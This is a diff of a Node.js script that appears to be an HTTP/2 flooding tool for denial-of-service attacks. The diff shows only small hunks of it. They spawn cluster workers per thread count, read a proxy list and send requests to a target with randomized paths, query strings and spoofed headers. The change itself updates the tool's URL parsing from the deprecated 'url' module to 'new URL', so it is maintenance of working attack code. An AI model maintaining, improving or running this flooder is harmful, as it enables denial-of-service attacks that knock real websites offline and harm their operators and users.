@@ -2,7 +2,6 @@ const net = require("net");
  const http2 = require("http2");
  const tls = require("tls");
  const cluster = require("cluster");
- const url = require("url");
  const crypto = require("crypto");
  const fs = require("fs");
  const axios = require('axios');
@@ -3196,7 +3195,7 @@ const cplist = [
  var dest1 = dest[Math.floor(Math.floor(Math.random() * dest.length))];
  var site1 = site[Math.floor(Math.floor(Math.random() * site.length))];
  var proxies = readLines(args.proxyFile);
- const parsedTarget = url.parse(args.target);
+const parsedTarget = new URL(args.target);
  
       if (cluster.isMaster) {
         for (let counter = 1; counter <= args.threads; counter++) {
@@ -3285,7 +3284,7 @@ const cplist = [
  const Socker = new NetSocket();
  headers[":method"] = "GET", randomMethod;
  headers[":authority"] = parsedTarget.host;
- headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
+ headers[":path"] = parsedTarget.pathname + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
  headers[":scheme"] = "https";
  headers["x-forwarded-proto"] = "https";
  headers["accept-language"] = lang;
